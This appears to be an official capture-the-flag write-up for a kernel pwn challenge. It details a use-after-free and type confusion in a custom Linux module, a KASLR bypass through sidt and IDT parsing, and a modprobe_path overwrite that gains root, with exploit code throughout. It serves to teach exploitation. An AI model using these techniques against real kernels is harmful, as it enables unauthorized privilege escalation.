![](../../assets/banner.png)



<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	    <font size="6">Heavy is the Krown</font>

​		15<sup>th</sup> May 2026 

​		Prepared By: w3th4nds

​		Challenge Author(s): w3th4nds

​		Difficulty: <font color=Red>Insane</font>

​		Classification: Official

​	







# Synopsis

Heavy Is The Krown is an **Insane** difficulty kernel pwn challenge built around a **deterministic use-after-free** in a custom Linux kernel module. The module manages "Crowns" and "Seals" through an ioctl interface. A missing reference count increment on `BIND`, combined with type-blind slot reuse on `FORGE`, allows an attacker to create a dangling pointer inside a Crown's `seals[]` array. By re-allocating the freed Seal slot as a new Crown, the attacker gains an arbitrary kernel read/write primitive via `WITNESS`/`INSCRIBE` on the hijacked `ptr` field. With KASLR active and no module information leaks, the kernel base is recovered through an **IDT scan** (`sidt` instruction + architectural IDT layout). Finally, `modprobe_path` is overwritten to escalate privileges and read the flag.

# Description

The Brine Signet lies shattered beneath the waves. Astrael has vanished into the upper storms. Only the Salt Crown remains -- heavy with the weight of a kingdom that drowns in its own blood. When the Seal broke, the Realm bled. The Cinderbound guard what remains. And the sea... the sea remembers everything.

## Skills Required

- Linux kernel module internals and character device ioctl interfaces.
- Understanding of the Linux slab allocator (`kmalloc-512`, `kzalloc`).
- Familiarity with x86-64 IDT structure and the `sidt` instruction.
- Kernel debugging with QEMU's gdbstub.
- Use-After-Free exploitation in kernel space.
- Arbitrary kernel read/write primitive construction.
- `modprobe_path` overwrite technique for post-exploitation.

## Skills Learned

- How to exploit deterministic UAF bugs in kernel modules without race conditions.
- Type confusion via slab slot reuse when object types share the same size.
- Using `sidt` + IDT entry parsing as a KASLR bypass when all other leaks are closed.
- Hijacking object pointers through dangling references to gain arbitrary kernel read/write.
- Kernel debugging workflow: QEMU + gdbstub + remote GDB with pwndbg.
- `modprobe_path` overwrite as a reliable post-exploitation path on modern kernels.

# Challenge Design

The challenge is a hardened evolution of a previous version with the following mitigations:

1. **No pointer salt**: Raw kernel pointers are stored directly in object fields.
2. **No module base leak**: The `krown_name` string and `krown_pivot` gadget are removed. Module base must be derived from architecture-level scans.
3. **Per-object cookie**: A 64-bit random cookie is assigned to each object and verified in `krown_lookup()`. However, UAF bypasses this because the dangling pointer still passes the cookie check (the reallocated object inherits the same slot and gets a new cookie, but the *dangling reference* is never validated).
4. **No symbol leaks**: `callback` is NULL on creation. `/proc/kallsyms` is protected by `kptr_restrict=2`.
5. **SMEP / SMAP / KPTI / KASLR**: All active. The kernel is built from source (Linux 6.1.100) with `x86_64_defconfig`.
6. **SLAB hardening**: `CONFIG_SLAB_FREELIST_HARDENED` and `CONFIG_SLAB_FREELIST_RANDOM` are enabled, but the exploit is deterministic because it controls both the free and the reallocation.
7. **Minimal attack surface**: Only 9 ioctls. `VALIDATE` and `RING` from previous versions are removed.

### Core Bugs (deterministic, no race)

**Bug 1: Missing refcount increment on BIND**
```c
layout->seals[layout->seal_count++] = seal;
/* BUG: missing seal refcount increment */
```
When a Seal is bound to a Crown, the Crown stores a raw pointer to the Seal. If the Seal is later `BREAK` freed, the Crown's `seals[]` array still contains the dangling pointer.

**Bug 2: Type-blind slot reuse on FORGE**
```c
static struct krown_object *krown_alloc(int type)
{
    ...
    for (i = 0; i < MAX_OBJECTS; i++) {
        if (!registry[i]) {
            registry[i] = obj;
            obj->id = i;
            obj->type = type;
            ...
        }
    }
}
```
`krown_alloc` reuses the first NULL slot in the global registry without any type checking. Both `Crown` and `Seal` are **496 bytes** (`kmalloc-512`), so a freed Seal's slot can be replaced by a newly forged Crown.

### Object Layout

```c
struct krown_object {
    int id;                 /* 0x00 */
    int type;               /* 0x04 */
    u64 cookie;             /* 0x08 */
    void *ptr;              /* 0x10 */
    size_t size;            /* 0x18 */
    void (*callback)(void); /* 0x20 */
    char data[456];         /* 0x28 */
};
```

Total size: **496 bytes** → `kmalloc-512`.

The `crown_layout` embedded in `data[]`:
```c
struct crown_layout {
    char name[32];                  /* 0x00 */
    int seal_count;                 /* 0x20 */
    int pad;                        /* 0x24 */
    struct krown_object *seals[16]; /* 0x28 */
};
```

When a Seal is bound to a Crown, its pointer is stored at `crown->data + 0x28 + seal_count*8`.

### Type Confusion

After the UAF:
- `Crown C` has `seals[0]` pointing to freed Seal `S`
- We forge a new Crown `C2` which reuses `S`'s slot
- `C->seals[0]` now points to `C2`
- `EXAMINE`/`IMPRESS` on `C->seals[0]` reads/writes `C2`'s fields
- Since `ptr` is at offset `0x10`, we can read/write `C2->ptr` via IMPRESS
- Then `WITNESS`/`INSCRIBE` on `C2` uses `C2->ptr` as the kernel read/write target

### KASLR Bypass: IDT Scan

With `kptr_restrict=2`, `/proc/kallsyms` returns `0x0000000000000000`. The module provides no leaks. The only reliable leak is architecture-level:

1. `sidt` instruction reads the IDT base address (not randomized on x86-64)
2. IDT entries have a fixed format. Entry 0 (divide error) contains the handler address
3. The handler `asm_exc_divide_error` is at a fixed offset from `_stext`
4. `kernel_base = handler - offset_from_stext`

# Enumeration

Players receive a ZIP containing:
```
challenge/
├── vmlinuz              # Kernel image (Linux 6.1.100)
├── initramfs.cpio.gz    # Compressed initramfs
└── run.sh               # QEMU runner script
```

## Step 1: Extract the initramfs

```console
$ unzip pwn_heavy_is_the_krown.zip
$ cd challenge
$ mkdir initramfs && cd initramfs
$ zcat ../initramfs.cpio.gz | cpio -id
$ ls
bin  dev  etc  flag.txt  home  init  lib  proc  root  sbin  sys  tmp
```

## Step 2: Inspect the init script and module

```console
$ cat init
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t tmpfs -o noexec,nodev,nosuid tmpfs /tmp
echo 2 > /proc/sys/kernel/kptr_restrict
mknod /dev/ttyS0 c 4 64
insmod /lib/modules/krown.ko
chmod -R 000 /sys/module/krown/sections/
sleep 1
major=$(grep krown /proc/devices | awk '{print $1}')
mknod /dev/krown c $major 0
chmod 666 /dev/krown
...
exec setsid /bin/cttyhack setuidgid 65534 /bin/sh
```

Key observations:
- `kptr_restrict=2`: No `/proc/kallsyms` leaks.
- `/sys/module/krown/sections/` has permissions `000`: No module section addresses.
- The module is loaded from `/lib/modules/krown.ko`.
- `/dev/krown` is created with mode `666`.
- The shell runs as `uid 65534` (nobody).
- `flag.txt` is at the root with permissions `400`.

## Step 3: Extract the kernel module

```console
$ file lib/modules/krown.ko
lib/modules/krown.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
```

The module is **not stripped**, which makes reverse engineering significantly easier.

## Step 4: Analyze the module with readelf and strings

```console
$ readelf -S lib/modules/krown.ko | grep -E "\.text|\.data|\.rodata|\.bss"
  [ 1] .text             PROGBITS         0000000000000000  00000040
  [ 2] .rela.text        RELA             0000000000000000  00000a80
  [ 3] .data             PROGBITS         0000000000000000  00000390
  [ 4] .bss              NOBITS           0000000000000000  000003c0
  [ 5] .rodata           PROGBITS         0000000000000000  000003c0
  [ 6] .rodata.str1.1    PROGBITS         0000000000000000  00000440

$ strings -t x lib/modules/krown.ko | grep -E "krown|Heavy|Crown|Seal|forge|bind|break"
   440  Heavy Is The Krown -- Regalia Registry initialized
   478  The Crown has been unmade.
   4a0  krown
   4a8  krown: %s
   4b0  Failed to register char device
```

## Step 5: Check kernel mitigations

Since this is a kernel challenge, there is no traditional `checksec`. Instead, we examine the kernel config and boot parameters:

```console
$ strings vmlinuz | grep -E "CONFIG_SLAB_FREELIST|CONFIG_KASLR|CONFIG_RANDOMIZE"
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_RANDOMIZE_BASE=y
```

Or extract the config from the kernel:
```console
$ ./scripts/extract-vmlinux vmlinuz > vmlinux_extracted
$ strings vmlinux_extracted | grep "CONFIG_IKCONFIG_PROC"
# If present, /proc/config.gz exists at runtime
```

From the QEMU command line in `run.sh`:
```console
$ cat run.sh
qemu-system-x86_64 \
  -cpu qemu64,+smep,+smap \
  -kernel ./vmlinuz \
  ...
```

| Mitigation | Status | Notes |
| :---: | :---: | :--- |
| **SMEP** | ✅ | `-cpu qemu64,+smep` |
| **SMAP** | ✅ | `-cpu qemu64,+smap` |
| **KPTI** | ✅ | Enabled by default in x86_64_defconfig |
| **KASLR** | ✅ | `CONFIG_RANDOMIZE_BASE=y` |
| **kptr_restrict** | **2** | Set in init script |
| **SLAB hardening** | ✅ | `CONFIG_SLAB_FREELIST_HARDENED` |
| **SLAB random** | ✅ | `CONFIG_SLAB_FREELIST_RANDOM` |

# Reverse Engineering & Debugging Guide

## Step 1: Disassembling the module with objdump

Since the module is not stripped, we have full symbols:

```console
$ objdump -d -M intel lib/modules/krown.ko > krown.asm
$ grep -n "<krown_ioctl>:" krown.asm
1234:0000000000000000 <krown_ioctl>:
```

Let's find all the ioctl handlers:

```console
$ grep "<krown_" krown.asm | head -20
0000000000000000 <krown_ioctl>:
0000000000000120 <krown_forge_crown>:
0000000000000260 <krown_forge_seal>:
0000000000000340 <krown_break>:
0000000000000420 <krown_bind>:
0000000000000600 <krown_unbind>:
0000000000000760 <krown_examine>:
0000000000000950 <krown_impress>:
0000000000000b40 <krown_witness>:
0000000000000c80 <krown_inscribe>:
0000000000000e80 <krown_lookup>:
0000000000000f20 <krown_alloc>:
0000000000001060 <krown_free>:
```

## Step 2: Analyzing krown_bind (the missing refcount bug)

```console
$ objdump -d -M intel --start-address=0x420 --stop-address=0x600 lib/modules/krown.ko
```

Key assembly:
```asm
0000000000000420 <krown_bind>:
  420:   55                      push   rbp
  421:   48 89 e5                mov    rbp,rsp
  ...
  ; krown_lookup(crown)
  ; krown_lookup(seal)
  ; layout = (struct crown_layout *)crown->data
  ; check seal_count < MAX_SEALS
  4a0:   48 8b 45 e0             mov    rax,QWORD PTR [rbp-0x20]   ; rax = crown
  4a4:   48 8d 50 28             lea    rdx,[rax+0x28]             ; rdx = crown->data
  4a8:   8b 45 dc                mov    eax,DWORD PTR [rbp-0x24]   ; eax = seal_count
  4ab:   48 98                   cdqe
  4ad:   48 8d 44 c2 28          lea    rax,[rdx+rax*8+0x28]       ; rax = &seals[seal_count]
  4b2:   48 8b 55 d0             mov    rdx,QWORD PTR [rbp-0x30]   ; rdx = seal
  4b6:   48 89 10                mov    QWORD PTR [rax],rdx        ; seals[seal_count] = seal
  4b9:   8b 45 dc                mov    eax,DWORD PTR [rbp-0x24]
  4bc:   83 c0 01                add    eax,0x1                    ; seal_count++
  4bf:   89 45 dc                mov    DWORD PTR [rbp-0x24],eax
  4c2:   b8 00 00 00 00          mov    eax,0x0                    ; return 0
  4c7:   c9                      leave
  4c8:   c3                      ret
```

There is **no `kref_get`**, no atomic increment, nothing. The Seal pointer is stored raw. If the Seal is freed via `krown_break`, the Crown still has a dangling pointer.

## Step 3: Analyzing krown_alloc (type-blind reuse)

```asm
0000000000000f20 <krown_alloc>:
  f20:   55                      push   rbp
  ...
  ; obj = kzalloc(sizeof(*obj), GFP_KERNEL)
  ; mutex_lock(&registry_lock)
  ; for (i = 0; i < MAX_OBJECTS; i++) {
  ;     if (!registry[i]) {
  ;         registry[i] = obj;
  ;         obj->id = i;
  ;         obj->type = type;   <-- type is just stored, never checked
  ...
```

The allocator walks `registry[]` linearly and uses the first NULL slot. There is no separate pool for Crowns vs Seals.

## Step 4: Analyzing EXAMINE and IMPRESS on dangling references

```asm
0000000000000760 <krown_examine>:
  ...
  ; seal = layout->seals[req->index]
  ; src = ((char *)seal) + req->offset
  ; memcpy(req->data, src, bytes)
```

```asm
0000000000000950 <krown_impress>:
  ...
  ; seal = layout->seals[req->index]
  ; dst = ((char *)seal) + req->offset
  ; memcpy(dst, req->data, bytes)
```

Neither `EXAMINE` nor `IMPRESS` validates that `seal` is still alive. They simply use the raw pointer from `seals[]`. This is the **arbitrary read/write primitive**.

## Step 5: Analyzing WITNESS and INSCRIBE

```asm
0000000000000b40 <krown_witness>:
  ...
  ; crown = krown_lookup(req->id)
  ; if (!crown->ptr) return -EINVAL
  ; src = (char *)crown->ptr + req->offset
  ; memcpy(req->data, src, bytes)
```

```asm
0000000000000c80 <krown_inscribe>:
  ...
  ; crown = krown_lookup(req->id)
  ; if (!crown->ptr) return -EINVAL
  ; dst = (char *)crown->ptr + req->offset
  ; memcpy(dst, req->data, bytes)
```

`WITNESS` reads from `crown->ptr + offset`. `INSCRIBE` writes to `crown->ptr + offset`. Both operate in kernel space. If we control `crown->ptr`, we have arbitrary kernel read/write.

## Step 6: Debugging with QEMU + GDB

### Launch QEMU with gdbstub

Edit `run.sh` to add `-s -S` (gdbstub on port 1234, pause at boot):

```console
$ cat > run_debug.sh << 'EOF'
#!/bin/sh
qemu-system-x86_64 \
      -nodefaults \
      -display none \
      -serial stdio \
      -cpu qemu64,+smep,+smap \
      -kernel ./vmlinuz \
      -initrd ./initramfs.cpio.gz \
      -append 'console=ttyS0 quiet loglevel=3 oops=panic panic=1 init=/init root=/dev/ram0 nokaslr' \
      -nographic \
      -no-reboot \
      -smp 2 \
      -m 256M \
      -s -S
EOF
$ chmod +x run_debug.sh
```

Note: `nokaslr` is added to the kernel command line for debugging convenience. For the real exploit, KASLR is active.

### Connect with GDB

In another terminal:

```console
$ gdb ./vmlinux
(gdb) target remote :1234
(gdb) c
```

The kernel boots. Once at the shell prompt, we can set breakpoints.

### Finding module functions in GDB

Since the module is loaded dynamically, its addresses change per boot. We find them via `/proc/modules` or the module's section addresses:

```gdb
(gdb) shell cat /proc/modules | grep krown
krown 16384 0 - Live 0xffffffffc0000000

(gdb) add-symbol-file lib/modules/krown.ko 0xffffffffc0000000
```

Now we can set breakpoints on module functions:

```gdb
(gdb) break krown_ioctl
(gdb) break krown_bind
(gdb) break krown_break
(gdb) break krown_alloc
(gdb) break krown_free
```

### Tracing the UAF in GDB

```gdb
# First, forge a crown and a seal
(gdb) c
# In the VM shell, run the exploit until just before break_obj(S)

(gdb) break krown_free
(gdb) c
# When break_obj(S) is called:
(gdb) p/x ((struct krown_object *)obj)->id
$1 = 0x1

(gdb) break krown_alloc
(gdb) c
# When C2 is forged (reusing the slot):
(gdb) p/x ((struct krown_object *)obj)->id
$2 = 0x1
(gdb) p/x ((struct krown_object *)obj)->type
$3 = 0x1   # TYPE_CROWN
```

Now the crown `C` at `registry[0]` still has `seals[0] = &registry[1]`, but `registry[1]` now points to a Crown instead of a Seal.

### Inspecting kmalloc caches

```gdb
(gdb) print kmem_cache->size
(gdb) x/10gx 0xffffffffc0000000 + offsetof(registry)
```

The slab allocator puts both Crowns and Seals in `kmalloc-512` because `sizeof(struct krown_object) = 496`.

## Step 7: Reconstructing structs from the source

With the module not stripped, a decompiler (Ghidra/Binary Ninja) will show almost the exact C code. But even with `objdump`, we can map the offsets:

```
struct krown_object:
    +0x00  id
    +0x04  type
    +0x08  cookie
    +0x10  ptr          <-- WITNESS/INSCRIBE target
    +0x18  size
    +0x20  callback
    +0x28  data[456]    <-- crown_layout for crowns

struct crown_layout (inside data):
    +0x00  name[32]
    +0x20  seal_count
    +0x24  pad
    +0x28  seals[16]    <-- raw pointers to seals
```

When we access `C->seals[0]` via EXAMINE/IMPRESS with `index=0`, the module computes:
```c
seal = layout->seals[0]           // reads from crown->data + 0x28
src  = ((char *)seal) + offset   // arbitrary offset into the "seal"
```

If `seal` is actually a Crown `C2`, then `offset=0x10` reaches `C2->ptr`.

# Disassembly

The module source is available (not stripped), so static analysis is straightforward. Here are the key functions decompiled:

### krown_ioctl (entry point)

```c
static long krown_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct krown_req req;
    if (_IOC_TYPE(cmd) != KROWN_MAGIC)
        return -ENOTTY;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
        return -EFAULT;
    switch (cmd) {
    case KROWN_FORGE_CROWN:  return krown_forge_crown(&req);
    case KROWN_FORGE_SEAL:   return krown_forge_seal(&req);
    case KROWN_BREAK:        return krown_break(&req);
    case KROWN_BIND:         return krown_bind(&req);
    case KROWN_UNBIND:       return krown_unbind(&req);
    case KROWN_EXAMINE:      return krown_examine(&req);
    case KROWN_IMPRESS:      return krown_impress(&req);
    case KROWN_WITNESS:      return krown_witness(&req);
    case KROWN_INSCRIBE:     return krown_inscribe(&req);
    default:                 return -ENOTTY;
    }
}
```

### krown_bind (vulnerable)

```c
static long krown_bind(struct krown_req *req)
{
    struct krown_object *crown, *seal;
    struct crown_layout *layout;
    crown = krown_lookup(req->id);
    if (!crown || crown->type != TYPE_CROWN)
        return -EINVAL;
    seal = krown_lookup(req->index);
    if (!seal || seal->type != TYPE_SEAL)
        return -EINVAL;
    layout = (struct crown_layout *)crown->data;
    if (layout->seal_count < 0 || layout->seal_count > MAX_SEALS)
        return -EINVAL;
    if (layout->seal_count >= MAX_SEALS)
        return -ENOSPC;
    layout->seals[layout->seal_count++] = seal;
    /* BUG: missing seal refcount increment */
    return 0;
}
```

### krown_examine / krown_impress (no dangling validation)

```c
static long krown_examine(struct krown_req *req)
{
    struct krown_object *crown, *seal;
    struct crown_layout *layout;
    char *src;
    crown = krown_lookup(req->id);
    if (!crown || crown->type != TYPE_CROWN)
        return -EINVAL;
    layout = (struct crown_layout *)crown->data;
    if (layout->seal_count < 0 || layout->seal_count > MAX_SEALS)
        return -EINVAL;
    if (req->index < 0 || req->index >= layout->seal_count)
        return -EINVAL;
    seal = layout->seals[req->index];     // <-- no validation that seal is alive
    if (!seal) return -EINVAL;
    src = ((char *)seal) + req->offset;
    memcpy(req->data, src, req->size);
    return 0;
}
```

### krown_witness / krown_inscribe (arbitrary kernel r/w)

```c
static long krown_witness(struct krown_req *req)
{
    struct krown_object *crown;
    char *src;
    crown = krown_lookup(req->id);
    if (!crown || crown->type != TYPE_CROWN)
        return -EINVAL;
    if (!crown->ptr)
        return -EINVAL;
    src = (char *)crown->ptr + req->offset;
    memcpy(req->data, src, req->size);    // <-- arbitrary kernel read
    return 0;
}

static long krown_inscribe(struct krown_req *req)
{
    struct krown_object *crown;
    char *dst;
    crown = krown_lookup(req->id);
    if (!crown || crown->type != TYPE_CROWN)
        return -EINVAL;
    if (!crown->ptr)
        return -EINVAL;
    dst = (char *)crown->ptr + req->offset;
    memcpy(dst, req->data, req->size);    // <-- arbitrary kernel write
    return 0;
}
```

# Debugging

## Setting up the debug environment

### 1. Build the Docker image locally

```console
$ docker build -t pwn_heavy_is_the_krown .
```

### 2. Extract vmlinux for GDB symbols

```console
$ id=$(docker create pwn_heavy_is_the_krown)
$ docker cp $id:/kernel/vmlinux ./vmlinux
$ docker rm -v $id
```

### 3. Launch QEMU with gdbstub

Create a debug runner:

```console
$ cat > debug.sh << 'EOF'
#!/bin/sh
qemu-system-x86_64 \
      -nodefaults \
      -display none \
      -serial stdio \
      -cpu qemu64,+smep,+smap \
      -kernel ./vmlinuz \
      -initrd ./initramfs.cpio.gz \
      -append 'console=ttyS0 quiet loglevel=3 oops=panic panic=1 init=/init root=/dev/ram0 nokaslr' \
      -nographic \
      -no-reboot \
      -smp 2 \
      -m 256M \
      -s -S
EOF
$ chmod +x debug.sh
```

Run it:
```console
$ ./debug.sh
```

### 4. Connect GDB

```console
$ gdb ./vmlinux
(gdb) target remote :1234
(gdb) c
```

### 5. Load module symbols

Once the kernel boots and the module is loaded:

```console
~ $ cat /proc/modules | grep krown
krown 16384 0 - Live 0xffffffffc0002000
```

In GDB:
```gdb
(gdb) add-symbol-file lib/modules/krown.ko 0xffffffffc0002000
```

### 6. Break on key functions and trace execution

```gdb
(gdb) break krown_ioctl
(gdb) break krown_bind
(gdb) break krown_break
(gdb) break krown_alloc
(gdb) break krown_free
(gdb) c
```

In the VM, run your exploit. GDB will stop at each breakpoint.

### 7. Inspecting the UAF state

When `krown_break` is hit:
```gdb
(gdb) p/x ((struct krown_object *)obj)->id
$1 = 0x1
(gdb) p/x ((struct krown_object *)obj)->type
$2 = 0x2   # TYPE_SEAL
```

Continue and when `krown_alloc` is hit for C2:
```gdb
(gdb) p/x ((struct krown_object *)obj)->id
$3 = 0x1
(gdb) p/x ((struct krown_object *)obj)->type
$4 = 0x1   # TYPE_CROWN
```

Now inspect the dangling reference:
```gdb
(gdb) p/x registry[0]->data[0x28/8]   # C->seals[0]
$5 = 0xffff888000000000 + offset_of_C2
```

### 8. Verifying arbitrary read/write

Set a breakpoint on `krown_witness`:
```gdb
(gdb) break krown_witness
(gdb) c
# When hit:
(gdb) p/x crown->ptr
$6 = 0xfffffe0000000000   # IDT base
(gdb) x/16gx crown->ptr
0xfffffe0000000000: 0x0000000000000000 0x0000000000000000
0xfffffe0000000010: 0x0000000000000000 0x0000000000000000
```

# Solution

## Exploitation Chain Overview

```
1. sidt  --> IDT base (architectural leak, bypasses KASLR)
2. FORGE Crown C + FORGE Seal S
3. BIND(C, S)  --> C->seals[0] = S (missing refcount!)
4. BREAK(S)    --> S freed, C->seals[0] dangling
5. FORGE Crown C2 --> C2 reuses S's slot (type confusion)
6. IMPRESS(C, 0, offset=0x10, 8, &idt_base)
   --> writes C2->ptr = IDT_base
7. WITNESS(C2, offset=0, size=16, buf)
   --> reads IDT[0] entry, extracts handler address
8. kernel_base = handler - offset_from_stext
9. modprobe_path = kernel_base + offset_modprobe_path
10. IMPRESS(C, 0, offset=0x10, 8, &modprobe_path)
    --> writes C2->ptr = modprobe_path
11. INSCRIBE(C2, offset=0, size=8, "/home/x\x00")
    --> overwrites modprobe_path
12. Write /home/x script + trigger binary
13. execve(trigger) --> kernel calls request_module() --> /home/x runs as root
14. Read /home/flag.txt
```

## Step 1: IDT Scan for KASLR Bypass

The IDT base is obtained via the `sidt` instruction, which is unprivileged:

```c
struct idtr {
    uint16_t limit;
    uint64_t base;
} __attribute__((packed));

asm volatile ("sidt %0" : "=m"(*idtr));
```

On x86-64 Linux, the IDT is at `0xfffffe0000000000` (or similar fixed high address). IDT entries are 16 bytes each. Entry 0 (divide error) contains:
- Offset 0-15: `entry[0:2]`
- Offset 16-31: `entry[6:8]`
- Offset 32-63: `entry[8:12]`

```c
static uint64_t parse_idt_entry(const uint8_t *entry)
{
    uint64_t off1 = *(uint16_t *)(entry + 0);
    uint64_t off2 = *(uint16_t *)(entry + 6);
    uint64_t off3 = *(uint32_t *)(entry + 8);
    return off1 | (off2 << 16) | (off3 << 32);
}
```

The handler `asm_exc_divide_error` is at a fixed offset from `_stext`. For this kernel build:
```c
static const uint64_t OFF_ASM_EXC_DIVIDE_ERROR = 0x00e00990ULL;
static const uint64_t OFF_MODPROBE_PATH        = 0x0184b380ULL;
```

```c
uint64_t handler = parse_idt_entry(idt_buf);
uint64_t kernel_base = handler - OFF_ASM_EXC_DIVIDE_ERROR;
uint64_t modprobe_path = kernel_base + OFF_MODPROBE_PATH;
```

## Step 2: Creating the UAF

```c
int C = forge_crown();
int S = forge_seal();
bind(C, S);       // C->seals[0] = S, no refcount increment
break_obj(S);     // S freed, C->seals[0] now dangling
```

## Step 3: Type Confusion

```c
int C2 = forge_crown();  // C2 reuses S's slot in registry[]
```

Now `C->seals[0]` points to `C2` (a Crown, not a Seal).

## Step 4: Hijacking C2->ptr via IMPRESS

We use `IMPRESS` on `C->seals[0]` (which is `C2`) to write to `C2->ptr`. The offset of `ptr` in `struct krown_object` is `0x10`:

```c
uint64_t idt_base = idt.base;
impress(C, 0, 0x10, 8, &idt_base);  // C2->ptr = IDT base
```

## Step 5: Reading the IDT Entry via WITNESS

Now `C2->ptr` points to the IDT. We use `WITNESS` on `C2` to read IDT entry 0:

```c
uint8_t idt_buf[256];
witness(C2, 0, sizeof(idt_buf), idt_buf);
uint64_t handler = parse_idt_entry(idt_buf);
```

## Step 6: Computing kernel_base and modprobe_path

```c
uint64_t kernel_base = handler - 0x00e00990;
uint64_t modprobe_path = kernel_base + 0x0184b380;
```

## Step 7: Overwriting modprobe_path

First, point `C2->ptr` to `modprobe_path`:
```c
impress(C, 0, 0x10, 8, &modprobe_path);
```

Then overwrite the path:
```c
const char *script = "/home/x\x00";
inscribe(C2, 0, 8, script);
```

`modprobe_path` is a global buffer in the kernel that stores the path to the userspace helper invoked when the kernel encounters an unknown file format. By default it is `/sbin/modprobe`. Overwriting the first 8 bytes with `/home/x\x00` is sufficient.

## Step 8: Triggering modprobe

We create a script at `/home/x` and a binary with an unknown magic number:

```c
int f = open("/home/x", O_WRONLY | O_CREAT | O_TRUNC, 0755);
write(f, "#!/bin/sh\ncat /flag.txt > /home/flag.txt\nchmod 666 /home/flag.txt\n", ...);
close(f);

int t = open("/home/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0755);
write(t, "\x13\x37\x13\x37", 4);  // non-printable magic
close(t);

execve("/home/trigger", argv, envp);
```

When `execve` runs `/home/trigger`, the kernel sees an unknown magic number and calls `request_module("binfmt-XXXX")`, which executes `/home/x` as **root**.

## Step 9: Reading the Flag

```c
int flagfd = open("/home/flag.txt", O_RDONLY);
read(flagfd, flag, sizeof(flag));
printf("[+] FLAG: %s\n", flag);
```

The solver:
1. Compiles `exp.c` statically with `musl-gcc` (or falls back to `gcc -static`)
2. Base64-encodes and gzips the binary
3. Uploads it in chunks via `printf` (busybox-compatible)
4. Decodes, decompresses, and executes the exploit
5. Reads and prints the flag
